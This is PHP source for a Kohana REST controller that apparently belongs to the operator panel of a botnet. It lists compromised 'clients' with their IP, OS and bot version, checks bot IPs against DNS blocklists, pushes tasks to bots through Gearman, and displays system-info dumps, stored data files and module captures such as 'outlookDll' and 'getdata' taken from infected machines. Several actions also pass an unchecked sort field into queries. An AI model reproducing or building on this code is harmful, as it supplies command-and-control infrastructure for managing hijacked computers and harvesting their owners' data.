<?php defined('SYSPATH') or die('No direct script access.');

class Controller_Rest_Clients extends Controller_Rest{

    public function action_filter(){
        $response = [];

        $clientModel = ORM::factory('Client');
        $clients = $clientModel->selectByFilter($this->post, Auth::instance()->get_user()->id);
        if ( false !== $clients ) {
            $clone = clone $clients;
            $total_items = $clone->count_all();
            unset($clone);
            $pagination = Pagination::factory([
                'total_items' => $total_items,
                'current_page' => [
                    'source' => 'route',
                    'key' => 'page',
                ],
            ]);
            $response['total_items'] = $pagination->getTotalItems();
            $response['current_page'] = $pagination->getCurrentPage();
            $response['items_per_page'] = $pagination->getItemsPerPage();

            $clients->limit($pagination->items_per_page)
                ->offset($pagination->offset);

            if($this->post['sortField']){
                $clients->order_by($this->post['sortField'], $this->post['reverse'] ? 'DESC': 'ASC');
            }

            $clients = $clients->find_all();
        } else {
            /* TODO add error output in template */
//            $errors = array_merge((array)$errors, $clientModel->getErrors());
//            $clients = null;
        }

        $alpha_country = Kohana::$config->load('country')->as_array();

        foreach($clients as $k => $v){
            $t = $v->as_array();
            $t['id'] = (int) $v->id;
            $t['client_ver'] = (int) $v->client_ver;
            $t['client'] = $v->getFullName();
            $t['created_at'] = $v->getDate('created_at');
            $t['last_activity'] = $v->getDate('last_activity');
            $t['nat'] = $v->getNat();

            $t['country'] = isset($alpha_country[$t['country']]) ? $alpha_country[$t['country']] : $t['country'];

            $t = Arr::extract($t, ['id', 'client', 'group', 'created_at', 'last_activity', 'importance', 'ip', 'sys_ver', 'country', 'client_ver', 'nat']);
            $response['clients'][$k] = $t;
        }

        $this->response->body(json_encode($response));
    }

    public function action_client_filter(){
        if(isset($this->post['client_id'])){
            $client_filter = trim($this->post['client_id']);
            $prefix = null;
            if ( preg_match('/^.*\.([0-9A-F]{32})$/i', $client_filter, $matches) ) {
                $prefix = explode('.', $client_filter)[0];
                $client_filter = $matches[1];
                $this->post['client_id'] =  $client_filter;
            }

            if ( preg_match('/^[0-9A-F]{32}$/i', $client_filter) ) {
                $clientid = Model::factory('Client')
                    ->getClientIDByName($client_filter, $prefix);

                if ($clientid) {
                    $this->response->body(json_encode(['url' => '/log/'.$clientid]));
                } else {
                    $this->response->body(json_encode(['errors' => 'ClientID not found!']));
                }
            } elseif ( '' != $client_filter ) {
                $this->response->body(json_encode(['errors' => 'ClientID field contains invalid input!']));
            }
        }else{
            $this->response->body(json_encode(['errors' => 'ClientID field is empty!']));
        }
    }

    // TODO need add handler in frontend
    public function action_push_back(){
        $this->post['user_id'] = Auth::instance()->get_user()->id;
        $data = json_encode($this->post);
        $client = Task_Helper::getAdminClient();
        $client->addTaskHigh("PushBack", $data, null, md5($data));
        $result = $client->runTasks();
        if ( false === $result || GEARMAN_SUCCESS != $client->returnCode() ) {
            $this->response->body(json_encode(['error' => 'Error!']));
            exit;
        }
        $this->response->body(json_encode(['success' => 'Complete!']));
    }

    public function action_dnsbl(){
        require_once Kohana::find_file('vendor/Net', 'DNSBL', 'php');
        $blacklist = Kohana::$config->load('dnsbl')->as_array();
        $dnsbl = new Net_DNSBL();
        $dnsbl->setBlacklists($blacklist);
        $this->response->body(
            $dnsbl->isListed($this->post['ip'])
        );
    }

    public function action_sys_info(){
        $response = [];
        $model = ORM::factory('Datafiles')
            ->where('client_id', '=', $this->post['client_id'])
            ->and_where('ctl', '=', 'GetSystemInfo')
            ->and_where('name', '=', 'systeminfo');

        $model = $this->paginate($response, $model, 3)
            ->order_by('created_at', 'DESC')
            ->find_all();

        foreach($model as $record){
            $response['data'][] = [
                'created_at' => $record->created_at,
                'id' => $record->id,
                'data' => pg_unescape_bytea($record->data),
            ];
        }
        $this->response->body(
            json_encode($response)
        );
    }

    public function action_storage(){
        $response = [];
        $model = ORM::factory('Var')
            ->where('client_id', '=', $this->post['client_id']);

        $model = $this->paginate($response, $model)
            ->order_by($this->post['sortField'], $this->post['reverse'] ? 'DESC': 'ASC')
            ->find_all();

        foreach($model as $k => $v){
            $response['data'][] = $v->as_array();
        }

        $this->response->body(json_encode($response));
    }

    public function action_datafiles(){
        $response = [];
        $model = ORM::factory('Datafiles')
            ->where('client_id', '=', $this->post['client_id'])
            ->and_where('name', '!=', 'systeminfo')
            ->and_where('ctl', '!=', 'GetSystemInfo');

        $model = $this->paginate($response, $model)
            ->order_by($this->post['sortField'], $this->post['reverse'] ? 'DESC': 'ASC')
            ->find_all();

        foreach($model as $k => $v){
            $response['data'][] = $v->as_array();
        }

        $this->response->body(json_encode($response));
    }

    public function action_clients_events(){
        $response = [];
        $model = ORM::factory('Client_Event')
            ->where('client_id', '=', $this->post['client_id']);

        $model = $this->paginate($response, $model)
            ->order_by($this->post['sortField'], $this->post['reverse'] ? 'DESC': 'ASC')
            ->find_all();

        foreach($model as $v){
            $t = $v->as_array();
            if(trim($t['info']) == 'Size - 0 kB'){
                $t['info'] = 'Size - '.Helper::humanFileSize(mb_strlen(pg_unescape_bytea($t['data'])));
            }
            if(trim($t['info']) == 'getdata'){
                $t['info'] = strlen(pg_unescape_bytea($t['data']));
            }
            if(trim($t['module']) == 'outlookDll'){
                $t['info'] = strlen(pg_unescape_bytea($t['data']));
            }

            if(!empty($t['data'])){
                $t['data'] = true;
            }else{
                $t['data'] = false;
            }
            $t['created_at'] = $this->getDate($t['created_at']);
            $t['id'] = strtotime($t['created_at']." UTC");
            $response['data'][] = $t;
        }

        $this->response->body(json_encode($response));
    }
}